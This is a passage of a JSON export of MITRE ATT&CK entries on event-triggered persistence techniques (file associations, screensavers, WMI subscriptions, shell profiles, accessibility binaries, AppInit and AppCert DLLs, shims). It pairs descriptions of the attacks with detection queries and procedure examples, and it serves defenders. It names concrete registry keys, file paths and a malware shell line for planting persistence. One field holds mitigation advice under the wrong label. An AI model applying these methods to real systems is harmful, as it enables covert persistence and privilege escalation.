    "Description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1][2][3]Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4][5][6]Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
    "Detects": [
      "Monitor the creation and modification of cloud resources that may be abused for persistence, such as functions and workflows monitoring cloud events.",
      "Monitor executed commands and arguments that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.",
      "Monitor newly constructed files that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc.",
      "Monitor for changes made to files that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.",
      "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",
      "Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.",
      "Monitor for changes made to windows registry keys and/or values that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.",
      "Monitor for newly constructed WMI Objects that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
    ],
    "Procedure Examples": [
      "KV Botnet Activityinvolves managing events on victim systems vialibeventto execute a callback function when any running process contains the following references in their path without also having a reference tobioset: busybox, wget, curl, tftp, telnetd, or lua. If thebiosetstring is not found, the related process is terminated.[7]",
      "Pacucan set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.[8]",
      "UPSTYLEcreates a.pthfile beginning with the textimportso that any time another process or script attempts to reference the modified item the malicious code will also run.[9]",
      "XCSSET'sdfhsebxzodmodule searches for.xcodeprojdirectories within the user’s home folder and subdirectories. For each match, it locates the correspondingproject.pbxprojfile and embeds an encoded payload into a build rule, target configuration, or project setting. The payload is later executed during the build process.[10][11]"
    ]
  },
  "T1546.001": {
    "Name": "Event Triggered Execution:Change Default File Association",
    "Description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.[1][2][3]Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed underHKEY_CLASSES_ROOT.[extension], for exampleHKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located atHKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key atHKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\print\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.[4]",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence by executing malicious content triggered by a file type association.",
      "Monitor for newly executed processes that may establish persistence by executing malicious content triggered by a file type association.",
      "Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process. User file association preferences are stored under[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExtsand override associations configured under[HKEY_CLASSES_ROOT]. Changes to a user's preference will occur under this entry's subkeys."
    ],
    "Procedure Examples": [
      "Kimsukyhas a HWP document stealer module which changes the default program association in the registry to open HWP documents.[5]",
      "SILENTTRINITYcan conduct an image hijack of an.mscfile extension as part of its UAC bypass process.[6]"
    ]
  },
  "T1546.002": {
    "Name": "Event Triggered Execution:Screensaver",
    "Description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.[1]The Windows screensaver application scrnsave.scr is located inC:\\Windows\\System32\\, andC:\\Windows\\sysWOW64\\on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:SCRNSAVE.exe- set to malicious PE pathScreenSaveActive- set to '1' to enable the screensaverScreenSaverIsSecure- set to '0' to not require a password to unlockScreenSaveTimeout- sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.[2]",
    "Detects": [
      "Monitor executed commands and arguments of .scr files.",
      "Monitor newly constructed files that may establish persistence by executing malicious content triggered by user inactivity.Analytic 1 - Created on disk that are being used as Screensaver files(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"11\") TargetObject=\"*\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\\SCRNSAVE.EXE\"",
      "Monitor for changes made to files that may establish persistence by executing malicious content triggered by user inactivity.Note: Although there are no standard events for file modification, Windows Event ID 4663 (An Attempt Was Made to Access An Object) can be used to alert on attempted accesses of screensaver files (typically ending in a file extension of .scr).",
      "Monitor newly executed processes that may establish persistence by executing malicious content triggered by user inactivity.Analytic 1 - HKCU\\Control Panel\\Desktop registry key(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") | where CommandLine LIKE \"%reg%\" AND CommandLine LIKE \"%add%\" AND CommandLine LIKE \"%HKCU\\Control Panel\\Desktop\\%\"",
      "Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior. Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Default screen saver files are stored in C:\\Windows\\System32. Use these files as a reference when defining list of not suspicious screen saver files.Analytic 1 - Registry Edit from Screensaversource=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode IN (13, 14) TargetObject=\"\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\\SCRNSAVE.EXE\""
    ],
    "Procedure Examples": [
      "Gazercan establish persistence through the system screensaver by configuring it to execute the malware.[2]"
    ]
  },
  "T1546.003": {
    "Name": "Event Triggered Execution:Windows Management Instrumentation Event Subscription",
    "Description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.[1]Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.[2][3]Adversaries may also compile WMI scripts – usingmofcomp.exe–into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.[4][5]WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
    "Detects": [
      "Monitor executed commands and arguments that can be used to register WMI persistence, such as theRegister-WmiEventPowerShellcmdlet[29]",
      "Monitor for MOF files outside of theHKLM\\SOFTWARE\\Microsoft\\WBEMfolder, as almost all legitimate MOF files will be stored in the WBEM folder.[30]Adversaries may create modified MOF files to be complied into WMI event subscriptions.",
      "Monitor newly executed processes that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).Note: Windows Event ID 4688 (A new process has been created) and Sysmon Event ID 1 (Process creation) can be used to alert on processes created by WMI event subscription triggers by filtering on events with a parent process name ofWmiPrvSe.exe.Monitor for execution of mofcomp.exe as a child of a suspicious shell or script running utility –\\powershell.exeor\\cmd.exe– or by having a suspicious path in the command line, such as%temp%.[31][32]Adversaries may compile modified MOF files using mofcomp.exe to create malicious WMI event subscriptions.",
      "Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.[33][34]Monitor for the creation of new WMIEventFilter,EventConsumer, andFilterToConsumerBindingevents. Event ID 5861 is logged on Windows 10 systems when newEventFilterToConsumerBindingevents are created.[35]"
    ],
    "Procedure Examples": [
      "adbupdcan use a WMI script to achieve persistence.[6]",
      "APT29has used WMI event subscriptions for persistence.[7]",
      "APT33has attempted to use WMI event subscriptions to establish persistence on compromised hosts.[8]",
      "BADHATCHcan use WMI event subscriptions for persistence.[9]",
      "Blue Mockingbirdhas used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.[10]",
      "FIN8has used WMI event subscriptions for persistence.[11]",
      "HEXANEhas used WMI event subscriptions for persistence.[12]",
      "HOPLIGHTcan use WMI event subscriptions to create persistence.[13]",
      "Kevincan compile randomly-generated MOF files into the WMI repository to persistently run malware.[12]",
      "Leviathanhas used WMI for persistence.[14]",
      "Metadorhas established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such ascdb.exe.[15]",
      "metaMainregistered a WMI event subscription consumer called \"hard_disk_stat\" to establish persistence.[15]",
      "Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence.[16]",
      "DuringOperation Ghost,APT29used WMI event subscriptions to establish persistence for malware.[17]",
      "PoshC2has the ability to persist on a system using WMI events.[18]",
      "POSHSPYuses a WMI event subscription to establish persistence.[19]",
      "POWERTONcan use WMI for persistence.[20]",
      "Rancorhas complied VBScript-generated MOF files into WMI event subscriptions for persistence.[21]",
      "RegDukecan persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.[17]",
      "Sardoniccan use a WMI event filter to invoke a command-line event consumer to gain persistence.[22]",
      "SeaDukeuses an event filter in WMI code to execute a previously dropped executable shortly after system startup.[3]",
      "SILENTTRINITYcan create a WMI Event to execute a payload for persistence.[23]",
      "During theSolarWinds Compromise,APT29used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor withrundll32.exe.[24][25]",
      "TrailBlazerhas the ability to use WMI for persistence.[26]",
      "Turlahas used WMI event filters and consumers to establish persistence.[27]"
    ]
  },
  "T1546.004": {
    "Name": "Event Triggered Execution:Unix Shell Configuration Modification",
    "Description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. UserUnix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the/etc/profileand/etc/profile.dfiles.[1][2]These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into~/.bash_profile,~/.bash_login, or~/.profilewhich are sourced when a user opens a command-line interface or connects remotely.[3][4]Since the system only executes the first existing file in the listed order, adversaries have used~/.bash_profileto ensure execution. Adversaries have also leveraged the~/.bashrcfile which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.[5][3][6][7]Some malware targets the termination of a program to trigger execution, adversaries can use the~/.bash_logoutfile to execute malicious commands at the end of a session.For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using/etc/profile,/etc/zshenv,/etc/zprofile, and/etc/zlogin.[8][9][10][11]The login shell then configures the user environment with~/.zprofileand~/.zlogin. The interactive shell uses the~/.zshrcto configure the user environment. Upon exiting,/etc/zlogoutand~/.zlogoutare executed. For legacy programs, macOS executes/etc/bashrcon startup.",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence through executing malicious commands triggered by a user’s shell.",
      "Monitor for newly constructed files that may establish persistence through executing malicious commands triggered by a user’s shell. For most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the/etc/shellsfile.",
      "Monitor for changes to/etc/profileand/etc/profile.d, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files.[18]",
      "Monitor newly executed processes that may establish persistence through executing malicious commands triggered by a user’s shell."
    ],
    "Procedure Examples": [
      "Green Lambertcan establish persistence on a compromised host through modifying theprofile,login, and run command (rc) files associated with thebash,csh, andtcshshells.[12][13]",
      "Linux Rabbitmaintains persistence on an infected machine through rc.local and .bashrc files.[14]",
      "When executing with non-root level permissions,RotaJakirocan install persistence by adding a command to the .bashrc file that executes a binary in the${HOME}/.gvfsd/.profile/folder.[15]",
      "DuringShadowRay, threat actors executed commands on interactive and reverse shells.[16]",
      "UsingAppleScript,XCSSETadds it's executable to the user's~/.zshrc_aliasesfile (\"echo \" & payload & \" > ~/zshrc_aliases\"), it then adds a line to the .zshrc file to source the.zshrc_aliasesfile ([ -f $HOME/.zshrc_aliases ] && . $HOME/.zshrc_aliases). Each time the user starts a newzshterminal session, the.zshrcfile executes the.zshrc_aliasesfile.[17]"
    ]
  },
  "T1546.005": {
    "Name": "Event Triggered Execution:Trap",
    "Description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. Thetrapcommand allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts likectrl+candctrl+d.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following formattrap 'command list' signalswhere \"command list\" will be executed when \"signals\" are received.[1][2]",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence by executing malicious content triggered by an interrupt signal.",
      "Monitor for newly constructed files that may establish persistence by executing malicious content triggered by an interrupt signal.",
      "Monitor for changes made to files that may establish persistence by executing malicious content triggered by an interrupt signal.",
      "Monitor newly executed processes that may establish persistence by executing malicious content triggered by an interrupt signal."
    ],
    "Procedure Examples": []
  },
  "T1546.006": {
    "Name": "Event Triggered Execution:LC_LOAD_DYLIB Addition",
    "Description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.[1]There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence by executing malicious content triggered by the execution of tainted binaries.",
      "Changes to binaries that do not line up with application updates or patches are also extremely suspicious.",
      "Monitor file systems for changes to application binaries and invalid checksums/signatures.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor processes for those that may be used to modify binary headers."
    ],
    "Procedure Examples": [
      "Binaries can also be baselined for what dynamic libraries they require, and if an app requires a new dynamic library that wasn't included as part of an update, it should be investigated.",
      "Enforce that all binaries be signed by the correct Apple Developer IDs.",
      "Allow applications via known hashes."
    ]
  },
  "T1546.007": {
    "Name": "Event Triggered Execution:Netsh Helper DLL",
    "Description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.[1]The paths to registered netsh.exe helper DLLs are entered into the Windows Registry atHKLM\\SOFTWARE\\Microsoft\\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.[2][3]",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence by executing malicious content triggered by Netsh Helper DLLs.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior.",
      "Monitor theHKLM\\SOFTWARE\\Microsoft\\Netshregistry key for any new or suspicious entries that do not correlate with known system files or benign software.[3]"
    ],
    "Procedure Examples": [
      "netshcan be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.[3]"
    ]
  },
  "T1546.008": {
    "Name": "Event Triggered Execution:Accessibility Features",
    "Description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs areC:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times andC:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.[1]Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in%systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP).[2]TheImage File Execution Options Injectiondebugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected overRemote Desktop Protocolwill cause the replaced file to be executed with SYSTEM privileges.[3]Other accessibility features exist that may also be leveraged in a similar fashion:[2][4]On-Screen Keyboard:C:\\Windows\\System32\\osk.exeMagnifier:C:\\Windows\\System32\\Magnify.exeNarrator:C:\\Windows\\System32\\Narrator.exeDisplay Switcher:C:\\Windows\\System32\\DisplaySwitch.exeApp Switcher:C:\\Windows\\System32\\AtBroker.exe",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes.Note: Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on abuse of Accessibility Features.",
      "Monitor newly constructed files that may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.",
      "Monitor for changes made to files that may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious.",
      "Monitor newly executed processes that may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.An adversary can use accessibility features (Ease of Access), such as StickyKeys or Utilman, to launch a command shell from the logon screen and gain SYSTEM access. Since an adversary does not have physical access to the machine, this technique must be run within Remote Desktop. To prevent an adversary from getting to the login screen without first authenticating, Network-Level Authentication (NLA) must be enabled. If a debugger is set up for one of the accessibility features, then it will intercept the process launch of the feature and instead execute a new command line. This analytic looks for instances of cmd.exe or powershell.exe launched directly from the logon process, winlogon.exe.Several accessibility programs can be run using the Ease of Access centersethc.exe handles StickyKeysutilman.exe is the Ease of Access menuosk.exe runs the On-Screen Keyboardnarrator.exe reads screen text over audiomagnify.exe magnifies the view of the screen near the cursorOne simple way to implement this technique is to note that in a default Windows configuration there are no spaces in the path to the system32 folder. If the accessibility programs are ever run with a Debugger set, then Windows will launch the Debugger process and append the command line to the accessibility program. As a result, a space is inserted in the command line before the path. Looking for any instances of a space in the command line before the name of an accessibility program will help identify when Debuggers are set.The Windows Registry location HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options allows for parameters to be set for applications during execution. One feature used by malicious actors is the \"Debugger\" option. When a key has this value enabled, a Debugging command line can be specified. Windows will launch the Debugging command line, and pass the original command line in as an argument. Adversaries can set a Debugger for Accessibility Applications. The analytic looks for the original command line as an argument to the Debugger. When the strings \"sethc.exe\", \"utilman.exe\", \"osk.exe\", \"narrator.exe\", and \"Magnify.exe\" are detected in the arguments, but not as the main executable, it is very likely that a Debugger is set.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic example looks for any creation of common accessibility processes such as sethc.exe but does no other filtering, which may result in false positives. Therefore, we recommend tuning any such analytics by including additional logic (e.g., testing the name of the parent process) that helps reduce false positives.Analytic 2 could depend on the possibility of the known strings used as arguments for other applications used in the day-to-day environment. Although the chance of the string \"sethc.exe\" being used as an argument for another application is unlikely, it still is a possibility.Analytic 1 - Command Launched from Winlogon(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND ParentImage=\"winlogon.exe\" AND Image=\"cmd.exe\"AND (CommandLine=\"sethc.exe\"OR CommandLine=\"utilman.exe\"OR CommandLine=\"osk.exe\" OR CommandLine=\"narrator.exe\" OR CommandLine=\"*magnify.exe\"Analytic 2 - Debuggers for Accessibility Applications(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") | where CommandLine match \"$..(sethcutilmanosknarratormagnify).exe\"",
      "Monitor Registry keys withinHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options."
    ],
    "Procedure Examples": [
      "APT29used sticky-keys to obtain unauthenticated, privileged console access.[5][6]",
      "APT3replaces the Sticky Keys binaryC:\\Windows\\System32\\sethc.exefor persistence.[7]",
      "APT41leveraged sticky keys to establish persistence.[8]",
      "Axiomactors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.[9]",
      "Deep Pandahas used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.[10]",
      "Empirecan leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.[11]",
      "Fox Kittenhas used sticky keys to launch a command prompt.[12]"
    ]
  },
  "T1546.009": {
    "Name": "Event Triggered Execution:AppCert DLLs",
    "Description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in theAppCertDLLsRegistry key underHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\are loaded into every process that calls the ubiquitously used application programming interface (API) functionsCreateProcess,CreateProcessAsUser,CreateProcessWithLoginW,CreateProcessWithTokenW, orWinExec.[1]Similar toProcess Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.",
      "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location.[9][10]",
      "Monitor and analyze application programming interface (API) calls that are indicative of Registry edits, such asRegCreateKeyExandRegSetValueEx.[1]",
      "Monitor newly executed processes that may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.",
      "Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc."
    ],
    "Procedure Examples": [
      "PUNCHBUGGYcan establish using a AppCertDLLs Registry key.[2]"
    ]
  },
  "T1546.010": {
    "Name": "Event Triggered Execution:AppInit DLLs",
    "Description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in theAppInit_DLLsvalue in the Registry keysHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WindowsorHKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windowsare loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.[1]Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.[2]Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes.",
      "Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such asRegCreateKeyExandRegSetValueEx.[1]",
      "Monitor newly executed processes that may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes.Note: Sysmon Event ID 1 (process create) and Windows Security Log Event ID 4688 (a new process has been created) can be used to detect new reg.exe processes that modify the AppInit DLL registry keys since the registry keys are specified as a command-line parameter.",
      "Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. These values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes. Accordingly, this analytic looks for modifications to these registry keys that may be indicative of this type of abuse.Analytic 1 - AppInit DLLssource=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode IN (12, 13, 14) TargetObject= \"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Appinit_Dlls*\" OR  TargetObject= \"*\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Appinit_Dlls*\""
    ],
    "Procedure Examples": [
      "APT39has used malware to setLoadAppInit_DLLsin the Registry keySOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windowsin order to establish persistence.[4]",
      "Some variants ofCherry Pickeruse AppInit_DLLs to achieve persistence by creating the following Registry key:HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"[5]",
      "Ramsaycan insert itself into the address space of other applications using the AppInit DLL Registry key.[6]",
      "If a victim meets certain criteria,T9000uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys:HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dllandHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1.[7]"
    ]
  },
  "T1546.011": {
    "Name": "Event Triggered Execution:Application Shimming",
    "Description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.[1]Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\\AppPatch\\sysmain.sdbandhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdbCustom databases are stored in:%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Customandhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used toBypass User Account Control(UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.[2]Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
    "Detects": [
      "Monitor executed commands and arguments for sdbinst.exe for potential indications of application shim abuse.",
      "Monitor for changes made to files that may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.",
      "Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor newly executed processs for sdbinst.exe for potential indications of application shim abuse. There are several public tools available that will detect shims that are currently available[7]:* Shim-Process-Scanner - checks memory of every running process for any shim flags* Shim-Detector-Lite - detects installation of custom shim databases* Shim-Guard - monitors registry for any shim installations* ShimScanner - forensic tool to find active shims in memory* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)",
      "Monitor for changes to windows registry keys and/or values that may establish persistence and/or elevate privileges by executing malicious content triggered by application shims."
    ],
    "Procedure Examples": [
